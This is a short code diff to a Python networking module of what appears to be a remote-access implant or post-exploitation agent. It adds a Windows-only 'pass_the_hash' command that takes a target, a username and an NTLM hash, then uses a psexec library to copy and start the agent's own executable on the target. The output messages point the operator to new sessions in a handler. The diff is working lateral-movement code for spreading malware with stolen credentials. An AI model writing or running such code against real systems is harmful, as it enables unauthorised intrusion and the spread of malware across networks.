@@ -3,6 +3,10 @@ import Queue
 import threading
 import socket
 from Crypto.Random import random # Already imported elsewhere so might as well use it
+from common import *
+import psexec
+import ntpath
+import sys
 
 class Networking:
 	"""
@@ -87,5 +91,19 @@ class Networking:
 			out += "\n"
 			
 		return out # This is absolutely horrible but I don't see how it can be improved
+		
+	@windows_only
+	def pass_the_hash(self, data):
+		try:
+			target, user, hash = data.split()
+		except: return "[*]Usage: pth [target] [username] [hash]"
+		
+		try:
+			psobj = psexec.PSEXEC('start "" '+ntpath.basename(sys.executable), "C:\\windows\\system32", None, ntpath.basename(sys.executable), username=user, hashes=hash)
+			psobj.run(target)
+		except Exception as e:
+			return "[-]Error occured during passing: "+str(e) 
+		
+		return "[+]Looks good. Check for new sessions in the handler."
 		
 net = Networking()
